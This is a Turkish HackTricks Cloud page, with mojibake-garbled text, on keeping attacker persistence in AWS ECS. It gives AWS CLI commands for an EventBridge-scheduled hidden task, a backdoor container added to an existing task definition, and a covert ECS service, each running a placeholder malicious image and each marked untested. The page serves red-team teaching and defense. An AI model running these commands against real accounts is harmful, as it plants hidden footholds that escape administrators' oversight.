# AWS - ECS KalÄ±cÄ±lÄ±ÄŸÄ±

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'i **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## ECS

Daha fazla bilgi iÃ§in kontrol edin:

{% content-ref url="../aws-hizmetleri/aws-ecs-enum.md" %}
[aws-ecs-enum.md](../aws-hizmetleri/aws-ecs-enum.md)
{% endcontent-ref %}

### Gizli Periyodik ECS GÃ¶revi

{% hint style="info" %}
TODO: Test
{% endhint %}

Bir saldÄ±rgan, Amazon EventBridge kullanarak **kÃ¶tÃ¼ niyetli bir gÃ¶revin periyodik olarak yÃ¼rÃ¼tÃ¼lmesini planlamak** iÃ§in gizli bir periyodik ECS gÃ¶revi oluÅŸturabilir. Bu gÃ¶rev, keÅŸif yapabilir, veri sÄ±zdÄ±rabilir veya AWS hesabÄ±nda kalÄ±cÄ±lÄ±k saÄŸlayabilir.
```bash
# Create a malicious task definition
aws ecs register-task-definition --family "malicious-task" --container-definitions '[
{
"name": "malicious-container",
"image": "malicious-image:latest",
"memory": 256,
"cpu": 10,
"essential": true
}
]'

# Create an Amazon EventBridge rule to trigger the task periodically
aws events put-rule --name "malicious-ecs-task-rule" --schedule-expression "rate(1 day)"

# Add a target to the rule to run the malicious ECS task
aws events put-targets --rule "malicious-ecs-task-rule" --targets '[
{
"Id": "malicious-ecs-task-target",
"Arn": "arn:aws:ecs:region:account-id:cluster/your-cluster",
"RoleArn": "arn:aws:iam::account-id:role/your-eventbridge-role",
"EcsParameters": {
"TaskDefinitionArn": "arn:aws:ecs:region:account-id:task-definition/malicious-task",
"TaskCount": 1
}
}
]'
```
### Mevcut ECS GÃ¶rev TanÄ±mÄ±nda Arka KapÄ± Konteyneri

{% hint style="info" %}
TODO: Test
{% endhint %}

Bir saldÄ±rgan, mevcut bir ECS gÃ¶rev tanÄ±mÄ±na **gizli bir arka kapÄ± konteyneri** ekleyebilir. Bu konteyner, meÅŸru konteynerlerle birlikte Ã§alÄ±ÅŸÄ±rken kalÄ±cÄ±lÄ±k saÄŸlamak ve kÃ¶tÃ¼ niyetli faaliyetler gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±labilir.
```bash
# Update the existing task definition to include the backdoor container
aws ecs register-task-definition --family "existing-task" --container-definitions '[
{
"name": "legitimate-container",
"image": "legitimate-image:latest",
"memory": 256,
"cpu": 10,
"essential": true
},
{
"name": "backdoor-container",
"image": "malicious-image:latest",
"memory": 256,
"cpu": 10,
"essential": false
}
]'
```
### BelgeleÅŸtirilmemiÅŸ ECS Hizmeti

{% hint style="info" %}
TODO: Test
{% endhint %}

Bir saldÄ±rgan, kÃ¶tÃ¼ niyetli bir gÃ¶rev Ã§alÄ±ÅŸtÄ±ran bir **belgeleÅŸtirilmemiÅŸ ECS hizmeti** oluÅŸturabilir. Ä°stenen gÃ¶rev sayÄ±sÄ±nÄ± minimuma ayarlayarak ve gÃ¼nlÃ¼ÄŸÃ¼ devre dÄ±ÅŸÄ± bÄ±rakarak, yÃ¶neticilerin kÃ¶tÃ¼ niyetli hizmeti fark etmesi daha zor hale gelir.
```bash
# Create a malicious task definition
aws ecs register-task-definition --family "malicious-task" --container-definitions '[
{
"name": "malicious-container",
"image": "malicious-image:latest",
"memory": 256,
"cpu": 10,
"essential": true
}
]'

# Create an undocumented ECS service with the malicious task definition
aws ecs create-service --service-name "undocumented-service" --task-definition "malicious-task" --desired-count 1 --cluster "your-cluster"
```
<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± kullanÄ±n!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek**.

</details>
